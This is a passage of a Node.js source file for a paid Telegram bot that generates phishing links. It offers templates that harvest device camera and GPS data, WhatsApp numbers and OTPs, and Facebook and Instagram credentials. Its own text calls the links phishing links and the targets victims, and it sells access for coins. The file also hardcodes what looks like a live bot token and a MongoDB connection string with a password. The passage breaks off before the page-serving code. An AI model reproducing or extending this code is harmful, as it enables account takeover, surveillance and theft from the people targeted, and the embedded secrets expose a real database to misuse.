const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const TOKEN = "8291862788:AAEvXOm7TSrCIjb1TxPm7rleiG_NooTgxdE"; // ⚠️ CHANGE THIS IMMEDIATELY
const OWNER_IDS = [6703335929, 6041728084, 5136260272, 7089533955, 6125809347]; 
const CHANNEL_ID1 = "@alphacodex369";
const CHANNEL_ID2 = "@Termuxcodex";
const GROUP_ID = "@code_x369"; 
const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority"; 

const START_IMG_URL = "https://graph.org/file/c3b658c9adaf0aba7153f-a22a3447d1410355a0.jpg";

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ extended: true }));

mongoose.connect(MONGO_URI)
    .then(() => console.log('✅ MongoDB Connected'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    chatId: { type: Number, unique: true },
    username: String,
    firstName: String,
    coins: { type: Number, default: 0 },
    freeUrlsLeft: { type: Number, default: 4 }, 
    isBanned: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now },
    referredBy: { type: Number, default: null },
    referralCount: { type: Number, default: 0 },
    subscriptionExpiry: { type: Date, default: null },
    isSudo: { type: Boolean, default: false }
});

const linkSchema = new mongoose.Schema({
    shortId: { type: String, unique: true },
    creatorChatId: Number,
    originalUrl: String, 
    customName: String,
    templateType: { type: String, default: 'Device' },
    createdAt: { type: Date, default: Date.now, expires: 86400 } 
});

const User = mongoose.model('User', userSchema);
const Link = mongoose.model('Link', linkSchema);

const userState = {};

let shareSystemEnabled = true;
let activeOffer = null; 
let botUsername = "codeurlbot";
bot.getMe().then(me => botUsername = me.username).catch(()=>{});

const fontMap = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'};

function _fnt(text) {
    if(!text) return "";
    return text.split('').map(c => fontMap[c] || c).join('');
}

function makeBorder(title, content) {
    const cleanTitle = title.replace(/<[^>]*>?/gm, ''); 
    const lines = content.split('\n').map(line => `┃ ${line}`).join('\n');
    return `<b>┏━━「 ${_fnt(cleanTitle)} 」━━┓</b>\n${lines}\n<b>┗━━━━━━━━━━┛</b>`;
}

function escapeHtml(text) {
    if (!text) return text;
    return text.toString()
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

async function resolveUser(msg, input) {
    if (msg.reply_to_message) return await User.findOne({ chatId: msg.reply_to_message.from.id });
    if (input) {
        const cleanInput = input.trim().replace('@', '');
        if (/^\d+$/.test(cleanInput)) return await User.findOne({ chatId: parseInt(cleanInput) });
        return await User.findOne({ username: { $regex: new RegExp(`^${cleanInput}$`, 'i') } });
    }
    return null;
}

async function checkAdmin(userId) {
    if (OWNER_IDS.includes(userId)) return true;
    const u = await User.findOne({ chatId: userId });
    return u && u.isSudo;
}

function hasActiveSub(user) {
    return user.subscriptionExpiry && user.subscriptionExpiry > Date.now();
}

function getSubTimeLeft(user) {
    if (!hasActiveSub(user)) return null;
    const diff = user.subscriptionExpiry - Date.now();
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    return `${days} ${_fnt("DAYS")}, ${hours} ${_fnt("HOURS")}`;
}

async function checkMembership(chatId) {
    try {
        const s = ['creator', 'administrator', 'member', 'restricted'];
        const [c1, c2, g1] = await Promise.all([
            bot.getChatMember(CHANNEL_ID1, chatId).catch(() => null),
            bot.getChatMember(CHANNEL_ID2, chatId).catch(() => null),
            bot.getChatMember(GROUP_ID, chatId).catch(() => null)
        ]);
        return { allJoined: (c1 && s.includes(c1.status)) && (c2 && s.includes(c2.status)) && (g1 && s.includes(g1.status)) };
    } catch (e) { return { allJoined: false }; }
}

bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.chat.type !== 'private') return;

    try {
        let user = await User.findOne({ chatId });
        
        if (!user) {
            user = new User({ 
                chatId, 
                username: msg.from.username || "Unknown", 
                firstName: escapeHtml(msg.from.first_name) || "User" 
            });

            if (match[1] && !isNaN(match[1]) && match[1] != chatId) {
                user.referredBy = parseInt(match[1]);
            }
            await user.save();

            if (shareSystemEnabled && user.referredBy) {
                const referrer = await User.findOne({ chatId: user.referredBy });
                if (referrer) {
                    referrer.referralCount += 1;
                    if (referrer.referralCount % 2 === 0) {
                        if (activeOffer && activeOffer.expiry > Date.now()) {
                            if (activeOffer.rewardType === 'coin') {
                                referrer.coins += activeOffer.value;
                                bot.sendMessage(referrer.chatId, makeBorder("OFFER UNLOCKED", `✅: ${_fnt("2 NEW USERS JOINED VIA YOUR LINK!")}\n💰: +${activeOffer.value} ${_fnt("COINS ADDED (SPECIAL OFFER).")}`), {parse_mode:'HTML'});
                            } else {
                                let multiplier = 0;
                                let amtStr = activeOffer.value;
                                let val = parseInt(amtStr);
                                if (amtStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
                                else if (amtStr.includes('w')) multiplier = 7 * 24 * 60 * 60 * 1000;
                                else if (amtStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
                                else if (amtStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
                                
                                let currentExp = referrer.subscriptionExpiry && referrer.subscriptionExpiry > Date.now() ? referrer.subscriptionExpiry.getTime() : Date.now();
                                referrer.subscriptionExpiry = new Date(currentExp + (val * multiplier));
                                bot.sendMessage(referrer.chatId, makeBorder("OFFER UNLOCKED", `✅: ${_fnt("2 NEW USERS JOINED VIA YOUR LINK!")}\n💎: +${amtStr} ${_fnt("SUBSCRIPTION ADDED (SPECIAL OFFER).")}`), {parse_mode:'HTML'});
                            }
                        } else {
                            referrer.freeUrlsLeft += 1;
                            bot.sendMessage(referrer.chatId, makeBorder("REFERRAL SUCCESS", `✅: ${_fnt("2 NEW USERS JOINED VIA YOUR LINK!")}\n💰: +1 ${_fnt("FREE LINK ADDED TO YOUR ACCOUNT.")}`), {parse_mode:'HTML'});
                        }
                    } else {
                        bot.sendMessage(referrer.chatId, makeBorder("REFERRAL TRACK", `✅: ${_fnt("1 NEW USER JOINED VIA YOUR LINK!")}\n⚠️: ${_fnt("INVITE 1 MORE TO GET YOUR REWARD.")}`), {parse_mode:'HTML'});
                    }
                    await referrer.save();
                }
            }
        }
        
        if (user.isBanned) {
            return bot.sendMessage(chatId, makeBorder("BANNED", `🚫: ${_fnt("YOU ARE BANNED FROM USING THIS BOT!")}`), {parse_mode:'HTML'});
        }

        const { allJoined } = await checkMembership(chatId);
        if (allJoined) {
            if (match[1] && isNaN(match[1])) {
                const cmd = match[1].toLowerCase();
                if (cmd === 'help') return handleHelp(chatId);
                if (cmd === 'create') return handleCreateUrl(chatId, user);
                if (cmd === 'info') return handleInfo(chatId, user);
                if (cmd === 'dev') return handleDev(chatId);
                if (cmd === 'referral') return handleShare(chatId, user);
            }
            await showMainMenu(msg);
        } else {
            await showVerificationMenu(msg);
        }
    } catch (error) { console.log(error); }
});

async function showMainMenu(msg) {
    const chatId = msg.chat.id || msg.from.id;
    const cleanName = escapeHtml(msg.from.first_name || "User");
    const mention = `<a href="tg://user?id=${chatId}">${cleanName}</a>`;
    
    const content = `<b>┏━━「 ${_fnt("DASHBOARD")} 」━━┓</b>
┃ <b>┏─「 ${_fnt("USER PROFILE")} 」</b>
┃ ┃ 👤 <b>${_fnt("NAME")}:</b> ${mention}
┃ ┃ 🆔 <b>${_fnt("ID")}:</b> <code>${chatId}</code>
┃ ┗───────────╼
┃ <b>┏─「 ${_fnt("BOT FEATURES")} 」</b>
┃ ┃ ✅ <b>${_fnt("CUSTOM URL GENERATION")}</b>
┃ ┃ ✅ <b>${_fnt("INSTANT DATA NOTIFICATION")}</b>
┃ ┃ ✅ <b>${_fnt("24/H SERVER UPTIME")}</b>
┃ ┃ ✅ <b>${_fnt("SECURE DATABASE")}</b>
┃ ┗───────────╼
┃ <b>┏─「 ${_fnt("HOW TO OPERATE")} 」</b>
┃ ┃ 1️⃣ <b>${_fnt("CLICK CREATE NEW URL")}</b>
┃ ┃ 2️⃣ <b>${_fnt("SELECT TEMPLATE TARGET")}</b>
┃ ┃ 3️⃣ <b>${_fnt("ENTER SHORT NAME FOR LINK")}</b>
┃ ┃ 4️⃣ <b>${_fnt("SHARE LINK & GET INSTANT DATA")}</b>
┃ ┗───────────╼
┃ <b>┏─「 ${_fnt("SYSTEM INFO")} 」</b>
┃ ┃ 👨‍💻 <b>${_fnt("DEVELOPER: DX-SIMU")}</b>
┃ ┗───────────╼
┃ <b>${_fnt("USAGE")}: /help</b>
<b>┗━━━━━━━━━━┛</b>`;

    await bot.sendPhoto(chatId, START_IMG_URL, {
        caption: content,
        parse_mode: 'HTML',
        reply_markup: { 
            keyboard: [
                [{ text: "🔗 " + _fnt("CREATE NEW URL") }], 
                [{ text: "👤 " + _fnt("MY INFO") }, { text: "👨‍💻 " + _fnt("DEVELOPER") }],
                [{ text: "🤝 " + _fnt("SHARE & EARN") }, { text: "💰 " + _fnt("BUY COIN") }]
            ], 
            resize_keyboard: true 
        }
    });

    await bot.sendMessage(chatId, `💬 <b>${_fnt("NEED HELP OR SUPPORT?")}</b>`, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [[{ text: "🛠 " + _fnt("SUPPORT GROUP"), url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
        }
    });
}

async function showVerificationMenu(msg) {
    const chatId = msg.chat.id || msg.from.id;
    const cleanName = escapeHtml(msg.from.first_name || "User");
    
    const dashboard = `<b>┏━━「 ${_fnt("WELCOME")} 」━━┓</b>
┃ <b>┏─「 👋 ${_fnt("HELLO USER")} 」</b>
┃ ┃ 👤 <b>${_fnt("NAME")}: <a href="tg://user?id=${chatId}">${cleanName}</a></b>
┃ ┃ 🆔 <b>${_fnt("ID")}:</b> <code>${chatId}</code>
┃ ┗───────────╼
┃ <b>┏─「 ${_fnt("SYSTEM INFO")} 」</b>
┃ ┃ 👨‍💻 <b>${_fnt("DEVELOPER: DX-SIMU")}</b>
┃ ┗───────────╼
<b>┗━━━━━━━━━━┛</b>
<blockquote><b>📢: ${_fnt("PLEASE JOIN OUR CHANNELS TO CONTINUE")}</b></blockquote>`;

    await bot.sendPhoto(chatId, START_IMG_URL, {
        caption: dashboard,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 " + _fnt("CHANNEL 1"), url: `https://t.me/${CHANNEL_ID1.replace('@', '')}` }],
                [{ text: "📢 " + _fnt("CHANNEL 2"), url: `https://t.me/${CHANNEL_ID2.replace('@', '')}` }],
                [{ text: "👥 " + _fnt("GROUP"), url: `https://t.me/${GROUP_ID.replace('@', '')}` }],
                [{ text: "✅ " + _fnt("VERIFY"), callback_data: "verify_join" }]
            ]
        }
    });
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    const allUserCmds = ['/start', '/create', '/info', '/dev', '/referral', '/help', '/gift', '/buy'];
    if (msg.chat.type !== 'private') {
        if (text && text.startsWith('/')) {
            const cmdPrefix = text.split(' ')[0].toLowerCase();
            if (allUserCmds.includes(cmdPrefix)) {
                const safeCmd = cmdPrefix.replace('/', '');
                bot.sendMessage(chatId, `<b>⚠️ ${_fnt("PLEASE USE COMMANDS IN PRIVATE CHAT")}</b>\n<b>┃ 🤖: ${_fnt("CLICK BELOW TO USE IN DM")}</b>`, {
                    parse_mode: 'HTML',
                    reply_to_message_id: msg.message_id,
                    reply_markup: {
                        inline_keyboard: [[{ text: "🤖 " + _fnt("GO TO BOT DM"), url: `https://t.me/${botUsername}?start=${safeCmd}` }]]
                    }
                });
            }
        }
        return; 
    }

    if (!text && !msg.caption && !msg.photo && !msg.video && !msg.document) return;

    const ignorePrefixes = ['/start', '/gift', '/sudo', '/share', '/add', '/rem', '/rm', '/reset', '/ban', '/unban', '/ulist', '/ulink', '/rmlink', '/menu', '/data', '/users', '/ref', '/offer', '/broadcast'];
    if (text && ignorePrefixes.some(prefix => text.startsWith(prefix))) return;

    if ((msg.caption && msg.caption.startsWith('/broadcast')) || (text && text.startsWith('/broadcast'))) return handleBroadcast(msg);

    if (!text) return;

    const user = await User.findOne({ chatId: msg.from.id });
    if (!user || user.isBanned) return;

    if (!OWNER_IDS.includes(msg.from.id)) {
        const { allJoined } = await checkMembership(chatId);
        if (!allJoined) {
            return showVerificationMenu(msg);
        }
    }

    if (text === "🔗 " + _fnt("CREATE NEW URL") || text === "/create") {
        handleCreateUrl(chatId, user);
    } 
    else if (text === "👤 " + _fnt("MY INFO") || text === "/info") {
        handleInfo(chatId, user);
    }
    else if (text === "👨‍💻 " + _fnt("DEVELOPER") || text === "/dev") {
        handleDev(chatId);
    }
    else if (text === "🤝 " + _fnt("SHARE & EARN") || text === "/referral") {
        handleShare(chatId, user);
    }
    else if (text === "/help") {
        handleHelp(chatId);
    }
    else if (text === "💰 " + _fnt("BUY COIN") || text === "/buy") {
        handleBuyCoin(chatId);
    }
    else if (userState[chatId]) {
        if (userState[chatId].step === 'await_custom_name') {
            const cleanName = text.trim().replace(/[^a-zA-Z0-9-_]/g, '');
            if(cleanName.length < 3) return bot.sendMessage(chatId, makeBorder("ERROR", `❌: ${_fnt("NAME IS TOO SHORT!")}`), {parse_mode:'HTML'});
            const exists = await Link.findOne({ shortId: cleanName });
            if(exists) return bot.sendMessage(chatId, makeBorder("ERROR", `❌: ${_fnt("THIS NAME IS ALREADY TAKEN!")}`), {parse_mode:'HTML'});
            
            userState[chatId].name = cleanName;
            askRedirect(msg, cleanName);
        } else if (userState[chatId].step === 'await_redirect_url') {
            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("ERROR", `❌: ${_fnt("URL MUST START WITH HTTP OR HTTPS")}`), {parse_mode:'HTML'});
            createFinalLink(msg, userState[chatId].name, text.trim());
        }
    }
});

// --- [STEP 1] ৪টি টেমপ্লেট টার্গেট বাটন ---
async function handleCreateUrl(chatId, user) {
    const isSub = hasActiveSub(user);
    if (!isSub && user.freeUrlsLeft <= 0 && user.coins <= 0) {
        return bot.sendMessage(chatId, makeBorder("NO COINS", `<b>🚫: ${_fnt("FREE TRIAL ENDED")}\n💰: ${_fnt("BUY COINS TO CONTINUE")}</b>`), {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "💰 " + _fnt("BUY COINS"), url: `https://t.me/d1d4x?text=**I%20WANT%20TO%20BUY%20COIN**%0A` }]] }
        });
    }
    
    let balText = isSub ? `<b>💎 ${_fnt("SUBSCRIPTION")}:</b> <code>${getSubTimeLeft(user)}</code>` : `<b>🎁 ${_fnt("FREE")}:</b> <code>${user.freeUrlsLeft}</code>\n<b>┃ 💰 ${_fnt("COINS")}:</b> <code>${user.coins}</code>`;
    
    const info = `<b>👤:</b> <code>${user.firstName}</code>
┃ ${balText}
┃ <b>┏─「 ${_fnt("SELECT TEMPLATE TARGET")} 」</b>
┃ ┃ 📱 <b>${_fnt("DEVICE: CAMERA & GPS DATA")}</b>
┃ ┃ 💬 <b>${_fnt("WHATSAPP: NUMBER & OTP")}</b>
┃ ┃ 📘 <b>${_fnt("FACEBOOK: CREDENTIALS")}</b>
┃ ┃ 📸 <b>${_fnt("INSTAGRAM: CREDENTIALS")}</b>
┃ ┗───────────╼`;

    bot.sendMessage(chatId, makeBorder("SELECT TEMPLATE", info), {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 " + _fnt("DEVICE (CAM & LOC)"), callback_data: "tpl_Device" }],
                [{ text: "💬 " + _fnt("WHATSAPP"), callback_data: "tpl_WhatsApp" }, { text: "📘 " + _fnt("FACEBOOK"), callback_data: "tpl_Facebook" }],
                [{ text: "📸 " + _fnt("INSTAGRAM"), callback_data: "tpl_Instagram" }]
            ]
        }
    });
}

function handleBuyCoin(chatId) {
    const buyText = `<b>┏━━「 ${_fnt("DASHBOARD")} 」━━┓
┃ ┏─「 ${_fnt("BUY COIN")} 」
┃ ┃  1. ₹30 = 60 ${_fnt("COINS")}
┃ ┃  2. ₹50 = 105 ${_fnt("COINS")}
┃ ┃  3. ₹100 = 210 ${_fnt("COINS")}
┃ ┃  4. ₹200 = 330 ${_fnt("COINS")}
┃ ┃  5. ₹300 = 2 ${_fnt("MONTHS FREE")}
┃ ┃  6. ₹500 = 5 ${_fnt("MONTHS FREE")}
┃ ┃  7. ₹1000 = 1 ${_fnt("YEAR FREE")}
┃ ┗───────────╼
┗━━━━━━━━━━━━━┛</b>`;

    const baseUrl = `https://t.me/d1d4x?text=**I%20WANT%20TO%20BUY%20COIN**%0A`;

    bot.sendMessage(chatId, buyText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "₹30 = 60 " + _fnt("COINS"), url: baseUrl + encodeURIComponent("Package ₹30 = 60 COINS") }],
                [{ text: "₹50 = 105 " + _fnt("COINS"), url: baseUrl + encodeURIComponent("Package ₹50 = 105 COINS") }],
                [{ text: "₹100 = 210 " + _fnt("COINS"), url: baseUrl + encodeURIComponent("Package ₹100 = 210 COINS") }],
                [{ text: "₹200 = 330 " + _fnt("COINS"), url: baseUrl + encodeURIComponent("Package ₹200 = 330 COINS") }],
                [{ text: "₹300 = 2 " + _fnt("MONTHS FREE"), url: baseUrl + encodeURIComponent("Package ₹300 = 2 MONTHS FREE") }],
                [{ text: "₹500 = 5 " + _fnt("MONTHS FREE"), url: baseUrl + encodeURIComponent("Package ₹500 = 5 MONTHS FREE") }],
                [{ text: "₹1000 = 1 " + _fnt("YEAR FREE"), url: baseUrl + encodeURIComponent("Package ₹1000 = 1 YEAR FREE") }],
                [{ text: "💳 " + _fnt("OTHER"), url: baseUrl + encodeURIComponent("Other Package") }]
            ]
        }
    });
}

async function handleInfo(chatId, user) {
    const activeLinkCount = await Link.countDocuments({ creatorChatId: chatId });
    const joinDate = user.joinedAt ? new Date(user.joinedAt).toLocaleDateString() : "N/A";
    
    let subData = "";
    if (hasActiveSub(user)) {
        subData = `<b>┃ ┃ 💎 ${_fnt("SUBSCRIPTION")}: ${getSubTimeLeft(user)}</b>\n`;
    } else {
        subData = `<b>┃ ┃ 💰 ${_fnt("COINS")}: ${user.coins}</b>\n<b>┃ ┃ 🎁 ${_fnt("FREE")}: ${user.freeUrlsLeft}</b>\n`;
    }

    const infoMsg = 
`<b>┏━━「 ${_fnt("YOUR INFO")} 」━━┓</b>
<b>┃ ┏─「 ${_fnt("USER PROFILE")} 」</b>
<b>┃ ┃ 👤 ${_fnt("NAME")}: ${user.firstName}</b>
<b>┃ ┃ 🆔 ${_fnt("ID")}: <code>${user.chatId}</code></b>
<b>┃ ┗───────────╼</b>
<b>┃</b> 
<b>┃ ┏─「 ${_fnt("PROFILE DETAILS")} 」</b>
${subData}<b>┃ ┃ 🛡 ${_fnt("BAN")}: ${user.isBanned ? "Yes" : "No"}</b>
<b>┃ ┃ 📅 ${_fnt("DATE")}: ${joinDate}</b>
<b>┃ ┃ 🔗 ${_fnt("LINKS")}: ${activeLinkCount}</b>
<b>┃ ┗───────────╼</b>
<b>┗━━━━━━━━━━┛</b>`;

    bot.sendMessage(chatId, infoMsg, { 
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "📢 " + _fnt("BUY COIN"), url: `https://t.me/d1d4x?text=**I%20WANT%20TO%20BUY%20COIN**%0A` }]
            ]
        }
    });
}

function handleDev(chatId) {
    bot.sendMessage(chatId, makeBorder("DEVELOPER", `👨‍💻: ${_fnt("CODED BY DX-CODEX")}\n🛡: ${_fnt("POWERED BY CODEX-TEAM")}`), { 
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [[{ text: "🛠 " + _fnt("SUPPORT GROUP"), url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
        }
    });
}

function handleShare(chatId, user) {
    const shareText = `<b>┏━━「 ${_fnt("REFERRAL SYSTEM")} 」━━┓</b>\n` +
                      `┃ 🚀 <b>${_fnt("INVITE FRIENDS & EARN!")}</b>\n` +
                      `┃ 👥 <b>${_fnt("FOR EVERY 2 NEW USERS:")}</b>\n` +
                      `┃ 💰 <b>${_fnt("YOU GET 1 FREE COIN!")}</b>\n` +
                      `┃\n` +
                      `┃ 📊 <b>${_fnt("YOUR REFERRALS")}:</b> <code>${user.referralCount || 0}</code>\n` +
                      `<b>┗━━━━━━━━━━━━━━━┛</b>\n\n` +
                      `👇 <b>${_fnt("CLICK BELOW TO SHARE YOUR LINK!")}</b>`;
    
    const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
    bot.sendMessage(chatId, shareText, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: "📲 " + _fnt("SHARE NOW"), url: inviteUrl }]] }
    });
}

function handleHelp(chatId) {
    const helpText = `<b>┏━━「 ${_fnt("HELP MENU")} 」━━┓</b>
┃ <b>┏─「 ${_fnt("USER COMMANDS")} 」
┃ ┃ 🔹 /create - <code>${_fnt("MAKE CUSTOM URL")}</code>
┃ ┃ 🔹 /info - <code>${_fnt("VIEW PROFILE")}</code>
┃ ┃ 🔹 /referral - <code>${_fnt("SHARE & EARN")}</code>
┃ ┃ 🔹 /dev - <code>${_fnt("DEVELOPER INFO")}</code>
┃ ┃ 🔹 /gift 10 [id] - <code>${_fnt("GIFT COINS TO USER")}</code>
┃ ┗───────────╼</b>
┃ <b>┏─「 ${_fnt("BUTTONS USAGE")} 」
┃ ┃ 🔘 ${_fnt("CREATE URL: MAKE NEW PHISHING LINKS")}
┃ ┃ 🔘 ${_fnt("MY INFO: CHECK ACTIVE STATS")}
┃ ┃ 🔘 ${_fnt("SHARE & EARN: GET REFERRAL LINK")}
┃ ┗───────────╼
┗━━━━━━━━━━┛</b>`;
    bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
}

function askRedirect(msg, name) {
    const chatId = msg.chat.id;
    const currentTpl = userState[chatId]?.template || 'Device';
    userState[chatId] = { name: name, step: 'await_choice', template: currentTpl };
    
    bot.sendMessage(chatId, `<b>┏━━「 ${_fnt("OPTION")} 」━━┓</b>\n┃ 📝: <b>${_fnt("NAME")}:</b> <code>${name}</code>\n┃ ❓: <b>${_fnt("DO YOU WANT TO REDIRECT")}\n┃ ${_fnt("YOUR VICTIM TO ANOTHER URL?")}</b>\n<b>┗━━━━━━━━━━┛</b>`, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: "✅ " + _fnt("YES"), callback_data: "use_redirect" }, { text: "❌ " + _fnt("NO"), callback_data: "no_redirect" }]] }
    });
}

async function createFinalLink(msg, name, redirectUrl) {
    const chatId = msg.chat.id;
    const user = await User.findOne({ chatId });
    const selectedTpl = userState[chatId]?.template || 'Device';
    
    const isSub = hasActiveSub(user);
    
    if (!isSub && user.freeUrlsLeft <= 0 && user.coins <= 0) {
        delete userState[chatId];
        return bot.sendMessage(chatId, makeBorder("ERROR", `❌: ${_fnt("NO COINS OR TRIALS LEFT!")}`), { parse_mode:'HTML' });
    }

    if (!isSub) {
        if (user.freeUrlsLeft > 0) user.freeUrlsLeft -= 1; else user.coins -= 1;
        await user.save();
    }

    await new Link({ shortId: name, creatorChatId: chatId, originalUrl: redirectUrl, templateType: selectedTpl }).save();
    delete userState[chatId];
    
    const hostUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const url = `${hostUrl}/w/${name}`;
    let bal = isSub ? _fnt("SUBSCRIPTION ACTIVE") : `${_fnt("REMAINING")}: ${user.coins} ${_fnt("COINS")}, ${user.freeUrlsLeft} ${_fnt("FREE")}`;
    
    bot.sendMessage(chatId, `<b>┏━━「 ✅ ${_fnt("SUCCESS")} 」━━┓</b>\n┃ 🎯: <b>${_fnt("TEMPLATE")}:</b> ${selectedTpl}\n┃ 🔗: ${url}\n┃ \n┃ 🔄: ${redirectUrl || 'N/A'}\n┃ 💰: ${bal}\n<b>┗━━━━━━━━━━┛</b>`, { parse_mode: 'HTML' });
}

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const fromId = query.from.id;
    const data = query.data;
    const msg = query.message;

    if (await checkAdmin(fromId)) {
        if (data === "rm_guide") {
            return bot.sendMessage(chatId, `📌 <b>${_fnt("REMOVAL GUIDE")}:</b>\n\nTo delete specific links:\n<code>/rmlink [ID] 1 3</code>\n\nTo delete everything:\n<code>/rmlink [ID] all</code>`, {parse_mode:'HTML'});
        }
        if (data.startsWith("delall_")) {
            const target = data.split('_')[1];
            await Link.deleteMany({ creatorChatId: target });
            return bot.editMessageText(`✅ All links for <code>${target}</code> removed.`, { chat_id: chatId, message_id: msg.message_id, parse_mode: 'HTML' });
        }
        if (data.startsWith("prompt_del_")) {
            const uid = data.split('_')[2];
            return bot.sendMessage(chatId, `👉 Copy & Edit:\n<code>/rmlink ${uid} 1</code>`, {parse_mode:'HTML'});
        }
    }

    if (data === 'verify_join') {
        try {
            const { allJoined } = await checkMembership(fromId);
            if (allJoined) {
                await bot.answerCallbackQuery(query.id, { text: "✅ VERIFICATION SUCCESS!" });
                try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}

                const user = await User.findOne({ chatId: fromId });
                const name = escapeHtml(user?.firstName || "User");
                const mention = `<a href="tg://user?id=${fromId}">${name}</a>`;

                const title = _fnt("SYSTEM READY");
                const body = `👤 <b>${_fnt("USER")}: ${mention}</b>\n🆔 <b>${_fnt("ID")}:</b> <code>${fromId}</code>\n━━━━━━━━━━━━━┛\n🤖 <b>${_fnt("THIS IS A DEVICE DATA DUMP")}\n        ${_fnt("PHISHING BOT")}\n🔗 ${_fnt("IF YOU WANT TO CREATE A URL")}\n      ${_fnt("CLICK THE BUTTON BELOW")}</b>`;

                await bot.sendMessage(chatId, makeBorder(title, body), {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🔗 " + _fnt("CREATE NEW URL"), callback_data: "create_custom" }],
                            [{ text: "🛠 " + _fnt("SUPPORT GROUP"), url: `https://t.me/${GROUP_ID.replace('@', '')}` }]
                        ]
                    }
                });

                await bot.sendMessage(chatId, `⌨️ <b>${_fnt("MENU KEYBOARD ACTIVATED.")}</b>`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            [{ text: "🔗 " + _fnt("CREATE NEW URL") }],
                            [{ text: "👤 " + _fnt("MY INFO") }, { text: "👨‍💻 " + _fnt("DEVELOPER") }],
                            [{ text: "🤝 " + _fnt("SHARE & EARN") }, { text: "💰 " + _fnt("BUY COIN") }]
                        ],
                        resize_keyboard: true
                    }
                });
            } else {
                bot.answerCallbackQuery(query.id, { text: "⚠️ JOIN ALL CHANNELS FIRST!", show_alert: true });
            }
        } catch (error) {}
        return;
    }

    if (!OWNER_IDS.includes(fromId)) {
        const { allJoined } = await checkMembership(fromId);
        if (!allJoined) {
            await bot.answerCallbackQuery(query.id, { text: "⚠️ YOU LEFT THE CHANNELS! PLEASE JOIN AGAIN.", show_alert: true });
            return showVerificationMenu(msg);
        }
    }

    const user = await User.findOne({ chatId: fromId });
    if (!user || user.isBanned) return;

    if (data.startsWith("tpl_")) {
        const tplName = data.split("_")[1];
        userState[chatId] = { template: tplName };
        await bot.answerCallbackQuery(query.id, { text: `${tplName} Selected!` });
        
        bot.sendMessage(chatId, makeBorder("STEP 2", `🎯 ${_fnt("TARGET")}: <b>${tplName}</b>\n\n🏷 <b>${_fnt("CHOOSE URL NAMING METHOD")}:</b>`), {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "✏️ " + _fnt("CUSTOM NAME"), callback_data: "create_custom" }, { text: "🎲 " + _fnt("RANDOM NAME"), callback_data: "create_random" }]] }
        });
        return;
    }

    if (data === 'cmd_info') {
        handleInfo(chatId, user);
        return bot.answerCallbackQuery(query.id);
    } else if (data === 'cmd_dev') {
        handleDev(chatId);
        return bot.answerCallbackQuery(query.id);
    } else if (data === 'cmd_referral') {
        handleShare(chatId, user);
        return bot.answerCallbackQuery(query.id);
    } else if (data === 'create_custom') {
        if (!userState[chatId]) userState[chatId] = { template: 'Device' };
        userState[chatId].step = 'await_custom_name';
        bot.sendMessage(chatId, makeBorder("CUSTOM", `<b>✏️: ${_fnt("SEND YOUR PHISHING LINK NAME")}</b>`), { parse_mode: 'HTML' });
    } else if (data === 'create_random') {
